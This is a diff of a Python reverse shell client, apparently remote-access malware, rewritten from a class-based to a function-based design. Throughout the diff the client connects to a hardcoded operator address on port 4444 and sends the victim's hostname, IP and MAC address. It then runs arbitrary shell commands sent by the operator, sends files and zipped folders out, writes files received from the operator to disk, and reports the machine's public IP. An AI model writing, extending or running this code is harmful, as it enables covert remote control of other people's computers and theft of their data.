@@ -1,231 +1,191 @@
-import os
 import platform
+import shutil
 import socket
-import struct
-import subprocess
+import sys
 import urllib.request
 import json
+import uuid
+import struct
+import subprocess
+import os
 
-IP = "127.0.0.1"
+
+IP = "192.168.0.53"
 PORT = 4444
 ARC = platform.system()
 
-class SendReceive:
-    def __init__(self, sock):
-        self.sock = sock
-    
-    def send(self, data):
-        if isinstance(data, str):
-            data = data.encode()
-        packed = struct.pack('>I', len(data)) + data
-        self.sock.sendall(packed)
-    
-    def recv(self):
-        data = self.recvall(4)
-        if not data:
-            return b""
-        data_len = struct.unpack(">I", data)[0]
-        return self.recvall(data_len)
-    
-    def recvall(self, n):
-        packet = b''
-        while len(packet) < n:
-            frame = self.sock.recv(n - len(packet))
-            if not frame:
-                return None
-            packet += frame
-        return packet
+def send(sock, data):
+    if isinstance(data, str):
+        data = data.encode()
+    data_size = len(data)
+    sock.sendall(struct.pack('>I', data_size)) 
+    sock.sendall(data) 
 
-class ReverseShellClient:
-    def __init__(self, comm):
-        self.comm = comm
-        self.current_dir = os.getcwd()
-        self.old_dir = ""
-        self.alive = True
+def recv(sock):
+    data_size = recvall(sock, 4)  
+    if not data_size:
+        return None 
+    data_len = struct.unpack(">I", data_size)[0]  
+    return recvall(sock, data_len)
 
-    def run_command(self, cmd):
-        try:
-            if os.name == 'nt':  
-                process = subprocess.Popen(
-                    cmd,
-                    shell=True,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    stdin=subprocess.PIPE,
-                    creationflags=subprocess.CREATE_NO_WINDOW  
-                )
-            else:  
-                process = subprocess.Popen(
-                    ['/bin/bash', '-c', cmd],
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    stdin=subprocess.PIPE,
-                    start_new_session=True  
-                )
-            output, error = process.communicate(timeout=15)
-            combined = output.decode('utf-8') + error.decode('utf-8')
-            return combined
-        except subprocess.TimeoutExpired:
-            process.kill()
-            return "Error: Command timed out"
-        
-        except Exception as e:
-            return f"Error: {e}".encode()
-    
-    def change_directory(self, path):
-        path = path.strip()
-        try:
-            if not path:
-                return f"Current directory: {os.getcwd()}".encode()
-            
-            if not os.path.isdir(path):
-                return f"cd: No such directory: {path}".encode()
-            
-            self.old_dir = os.getcwd()
-            os.chdir(path)
-            return f"{os.getcwd()}".encode()
-        except Exception as e:
-            return f"cd error: {e}".encode()
-    
-    def get_ip_info(self):
+def recvall(sock, n):
+    packet = b'' 
+    while len(packet) < n:
+        frame = sock.recv(n - len(packet))  
+        if not frame:
+            return None  
+        packet += frame  
+    return packet  
+
+def get_ip_info(sock):
         try:
             lip = str(socket.gethostbyname(socket.gethostname()))
             res = urllib.request.urlopen('https://api.ipify.org?format=json', timeout=3)
             data = json.loads(res.read().decode())
             pip = data.get('ip', 'Unknown')
-            output = {
+            ips = {
                 "pip": pip,
                 "lip": lip
             }
+            output = json.dumps(ips).encode()
+            send(sock, output)
+        except Exception as e:
+            print(f"Error IP info: {e}") 
+
+def upload(sock, path):
+    if os.path.exists(path):
+        file_name = os.path.basename(path)
+        try:
+            if os.path.isdir(path):
+                zip_file = shutil.make_archive(file_name, 'zip', path)
+                with open(zip_file, "rb") as f:
+                    file_data = f.read()
+                os.remove(zip_file)
+                send(sock, f"FILE_NAME: {file_name}.zip".encode())
+                send(sock, file_data)
+            else:
+                with open(path, "rb") as f:
+                    file_data = f.read()
+                send(sock, f"FILE_NAME: {file_name}".encode())
+                send(sock, file_data)
+        except Exception as e:
+            send(sock, f"ERROR: Could not read file. {str(e)}".encode())
+    else:
+        send(sock, "ERROR: File or folder not found.".encode())
+
+def download(sock, path):
+    save_dir = os.getcwd()
+    full_save_path = os.path.normpath(os.path.join(save_dir, path))
+    if not save_dir or not path:
+        return
+    try:
+        data = recv(sock)
+        with open(full_save_path, 'wb') as f:
+            f.write(data)
+        send(sock, f"File saved in {save_dir}".encode())
+    except Exception as e:
+        send(sock, "ERROR: Failed to upload the file".encode())
+
+def kill_connection(sock):
+        sock.close()
+        sys.exit()
+
+def handle_shell(sock):
+     while True:
+        cmd = recv(sock).decode()
+        if cmd == "exit_shell":
+            break
+        try:
+            if cmd.startswith("cd"):
+                dir = cmd[3:].strip()
+                if not dir:
+                    send(sock, f"$ {os.getcwd()}\nEND_OF_OUTPUT".encode())
+                    continue
+                try:
+                    os.chdir(dir)
+                    send(sock, f"$ {os.getcwd()}\nEND_OF_OUTPUT".encode())
+                except FileNotFoundError:
+                    send(sock, f"cd: No such directory\nEND_OF_OUTPUT".encode())
+                continue
+            else:
+                proc = subprocess.Popen(
+                    cmd,
+                    shell=True,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.STDOUT,
+                    stdin=subprocess.PIPE
+                )
+                for line in proc.stdout:
+                    send(sock, line)
+                send(sock, b"END_OF_OUTPUT")      
+        except Exception as e:
+            send(sock, f"Error: {str(e)}\n".encode())
+            send(sock, b"END_OF_OUTPUT")
+
+def handle_cmd(sock):
+    try:
+        while True:
+            cmd = recv(sock).decode()
+            if not cmd or cmd == None:
+                continue
+            try:
+                if cmd == "getip":
+                    get_ip_info(sock)
+                
+                elif cmd == "shell":
+                    handle_shell(sock)
+
+                elif cmd.startswith("download "):
+                    path = cmd[len("download "):].strip()
+                    upload(sock, path)
+
+                elif cmd.startswith("upload "):
+                    path = cmd[len("upload "):].strip()
+                    download(sock, path)
+                    
+                elif cmd.lower() == "kill":
+                    kill_connection(sock)
+                    
+                else:
+                    response = f"Received cmd: {cmd}"
+                    print(response)
+            except socket.error as e:
+                print(f"Error cmd: {e}")
+                sock.close()
+                sys.exit(0)
+                break
+                
+    except Exception as e:
+        print(f"\nCommand handler error: {e}")
+        sock.close()
+        sys.exit(0)
+
+def gsi():
+        try:
+            hn = platform.node()
+            lip = str(socket.gethostbyname(socket.gethostname()))
+            m = uuid.getnode()
+            mc = ':'.join(['{:02x}'.format((m >> ele) & 0xff) for ele in range(40, -1, -8)])
+            output = {
+                "lip": lip,
+                "hname": hn,
+                "mac": mc
+            }
             return json.dumps(output).encode()
         except Exception as e:
-            return f"Error getting IP info: {e}".encode()
+            return f"Error getting info: {e}".encode()
         
-    def download_file(self, local_path):
-        try:
-            save_dir = os.getcwd()
-            full_save_path = os.path.normpath(os.path.join(save_dir, local_path))
-            print("debug client full save path", full_save_path)
-            if not save_dir or not local_path or not save_dir:
-                return
-            handshake = self.comm.recv().decode()
-            print("debug handshake upload", handshake)
-            if handshake != "$up:start~+":
-                raise Exception("Invalid upload start marker")
-            with open(full_save_path, 'wb') as f:
-                while True:
-                    chunk = self.comm.recv()
-                    if chunk == b"up:done+*<+":
-                        break
-                    if chunk == b"up:aborted+*~":
-                        raise Exception("Transfer aborted by server")
-                    f.write(chunk)
-            return(b"Upload Successfull (client)")
-        except Exception as e:
-            print("Error downloading file:", e)
-            self.comm.send(b"Client error upload file")
-    
-    def file_send(self,file):
-        # print(f"debug: sending file start (file_send): {file}")
-        with open(file,"rb") as file_u:
-          for data in iter(lambda: file_u.read(4096), b""):
-            try:
-              self.comm.send(data)
-            except:
-              file_u.close()
-              self.comm.send(b"aborted+*~")
-        # print(f"debug: sending file (file_send end): {file}")
-        self.comm.send(b"done+*<+")
-
-    def upload_file(self, local_path):
-        if not os.path.exists(local_path):
-            self.comm.send(b"error: No such file or directory")
-            return
-        self.comm.send(b"ready*+~")
-
-        if os.path.isdir(local_path):
-            self.comm.send(b"*is_dir+~")
-            all_files = []
-            for root, _, files in os.walk(local_path):
-                for file in files:
-                    full_path = os.path.join(root, file)
-                    rel_path = os.path.relpath(full_path, local_path)
-                    all_files.append(rel_path)
-            self.comm.sock.sendall(struct.pack('>I', len(all_files)))
-            print(f"files sent {len(all_files)}")
-
-            for rel_path in all_files:
-                self.comm.send(rel_path.encode())
-                full_path = os.path.join(local_path, rel_path)
-                self.file_send(full_path)
-                # with open(path, 'rb') as f:
-                #     while True:
-                #         chunk = f.read(4096)
-                #         if not chunk:
-                #             break
-                #         self.comm.send(chunk)
-                # self.comm.send(b"done+*<+")
-        else: 
-            self.comm.send(b"file~%*")
-            # print(f"debug: sending file (upload file): {local_path}")
-            self.file_send(local_path)
-            
-    def kill_connection(self):
-        """Gracefully terminate the connection"""
-        self.alive = False
-        self.comm.send(b"Terminating connection...")
-        self.comm.sock.close()
-        return b""
-    
-    def handle_connection(self):
-        while self.alive:
-            output = None
-            try:
-                cmd = self.comm.recv().decode().strip()
-                print("Received command:", cmd)  
-                
-                if cmd == None or not cmd:
-                    output = b"Client msg: Empty command received. No action." 
-                if cmd.startswith("cd"):
-                    path = cmd[3:]
-                    output = self.change_directory(path)
-                elif cmd.lower() == "getip":
-                    output = self.get_ip_info()
-                elif cmd.lower().startswith("download"):
-                    local_path = cmd[9:].strip()
-                    self.upload_file(local_path)
-                    continue
-                elif cmd.lower().startswith("upload"):
-                    remote_path = cmd[7:].strip()
-                    output = self.download_file(remote_path)
-                elif cmd.lower() == "kill":
-                    output = self.kill_connection()
-                    break
-                else:
-                    output = self.run_command(cmd)
-                
-                if output is not None:
-                    self.comm.send(output)
-            
-            except (socket.error, KeyboardInterrupt):
-                print(f"Connection error: {e}")
-                self.kill_connection()
-                break
-            except Exception as e:
-                print(f"Output failed: {e}")
-                e_msg = f"Client output error: {e}"
-                self.comm.send(e_msg.encode('utf-8'))
 
 def main():
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect((IP, PORT))
+        info = gsi()
+        send(sock, info)
         print("Connected to server...")
-        
-        comm = SendReceive(sock)
-        client = ReverseShellClient(comm)
-        client.handle_connection()
-    
+
+        handle_cmd(sock)
+
     except Exception as e:
         print(f"Connection error: {e}")
         exit(1)
